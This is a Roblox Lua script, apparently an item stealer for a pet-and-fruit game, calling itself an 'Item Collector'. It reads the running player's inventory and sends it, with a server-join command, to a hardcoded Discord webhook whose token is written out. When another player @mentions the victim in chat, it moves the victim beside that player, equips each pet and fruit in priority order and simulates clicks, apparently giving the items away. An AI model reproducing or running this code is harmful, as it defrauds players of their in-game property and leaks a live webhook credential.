-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Item patterns
local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d+%.%d+)kg%]"
local PET_PATTERN = "(.+)%s%[(%d+%.%d+)%sKG%]%s%[Age%s(%d+)%]"

-- Track current equipped tool
local currentTool = nil
local toolRemovedConn = nil

-- Tool verification system
local function monitorToolRemoval()
    if toolRemovedConn then
        toolRemovedConn:Disconnect()
    end
    
    toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
        if child == currentTool then
            currentTool = nil
            toolRemovedConn:Disconnect()
        end
    end)
end

-- Inventory scanner with priority sorting
local function scanInventory(player)
    local fruits = {}
    local pets = {}
    local rarePets = {}
    
    for _, item in pairs(player.Backpack:GetChildren()) do
        local name = item.Name
        
        -- Parse fruits
        local fruitTraits, fruitName, fruitWeight = name:match(FRUIT_PATTERN)
        if fruitName then
            local traitCount = select(2, fruitTraits:gsub(",", "")) + 1
            table.insert(fruits, {
                name = name,
                item = item,
                traits = fruitTraits,
                traitCount = traitCount,
                weight = tonumber(fruitWeight)
            })
        
        -- Parse pets
        else
            local petName, petWeight, petAge = name:match(PET_PATTERN)
            if petName then
                local isRare = false
                for _, rarePet in pairs(RARE_PETS) do
                    if petName:find(rarePet) then
                        isRare = true
                        break
                    end
                end
                
                local petData = {
                    name = name,
                    item = item,
                    weight = tonumber(petWeight),
                    age = tonumber(petAge),
                    isRare = isRare
                }
                
                table.insert(pets, petData)
                if isRare then
                    table.insert(rarePets, petData)
                end
            end
        end
    end
    
    -- Sort pets by priority (rare > weight > age)
    table.sort(pets, function(a, b)
        if a.isRare ~= b.isRare then
            return a.isRare
        elseif a.weight ~= b.weight then
            return a.weight > b.weight
        else
            return a.age > b.age
        end
    end)
    
    -- Sort fruits by priority (trait count > weight)
    table.sort(fruits, function(a, b)
        if a.traitCount ~= b.traitCount then
            return a.traitCount > b.traitCount
        else
            return a.weight > b.weight
        end
    end)
    
    return fruits, pets, rarePets
end

-- Send initial inventory to Discord
local function sendInitialInventory()
    local fruits, pets, rarePets = scanInventory(LocalPlayer)
    
    local embed = {
        title = "📦 "..LocalPlayer.Name.."'s Inventory",
        description = "Ready to collect items!",
        color = #rarePets > 0 and 0xFF0000 or 0x00FF00,
        fields = {
            {
                name = "🐾 Pets ("..#pets..")",
                value = #pets > 0 and "```"..table.concat(
                    table.create(#pets, function(i) 
                        return pets[i].name..(pets[i].isRare and " ★" or "") 
                    end), 
                    "\n"
                ).."```" or "```None```",
                inline = true
            },
            {
                name = "🍇 Fruits ("..#fruits..")",
                value = #fruits > 0 and "```"..table.concat(
                    table.create(#fruits, function(i) return fruits[i].name end), 
                    "\n"
                ).."```" or "```None```",
                inline = true
            },
            {
                name = "🔗 Join Server",
                value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', 
                    game.PlaceId, game.JobId),
                inline = false
            }
        }
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
            content = #rarePets > 0 and "@everyone" or nil,
            embeds = {embed}
        }))
    end)
end

-- Interaction system with verification
local function collectFromPlayer(targetPlayer)
    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    -- Max zoom out
    LocalPlayer.CameraMaxZoomDistance = math.huge
    LocalPlayer.CameraMinZoomDistance = math.huge
    LocalPlayer.CameraMode = Enum.CameraMode.Classic

    -- Position in front of target
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))

    -- Get sorted inventory
    local fruits, pets = scanInventory(targetPlayer)
    local allItems = {}
    
    -- Add pets first (already sorted)
    for _, pet in pairs(pets) do
        table.insert(allItems, pet.item)
    end
    
    -- Then add fruits (already sorted)
    for _, fruit in pairs(fruits) do
        table.insert(allItems, fruit.item)
    end

    -- Process each item
    for _, item in pairs(allItems) do
        -- Equip the item
        humanoid:EquipTool(item)
        currentTool = item
        monitorToolRemoval()
        task.wait(0.5)

        -- Click and hold for 5 seconds
        local viewport = Camera.ViewportSize
        local center = Vector2.new(viewport.X/2, viewport.Y/2)
        
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
        
        -- Wait for 5 seconds or until tool is removed
        local startTime = os.clock()
        while os.clock() - startTime < 5 and currentTool ~= nil do
            task.wait(0.1)
        end
        
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
        
        -- If tool wasn't removed, unequip it manually
        if currentTool then
            humanoid:UnequipTools()
            currentTool = nil
        end
        
        task.wait(1) -- Cooldown
    end
end

-- Chat handler
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Check for @mention
    if not message:lower():match("@%s*"..LocalPlayer.Name:lower()) then
        return
    end
    
    -- Collect from player
    collectFromPlayer(player)
end

-- Initial setup
local function initialize()
    -- Send initial inventory
    sendInitialInventory()
    
    -- Setup chat listeners
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(onPlayerChatted)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(onPlayerChatted)
    end)
    
    print("✅ Item Collector Active!")
end

-- Start with error protection
local success, err = pcall(initialize)
if not success then
    warn("❌ Initialization failed:", err)
end
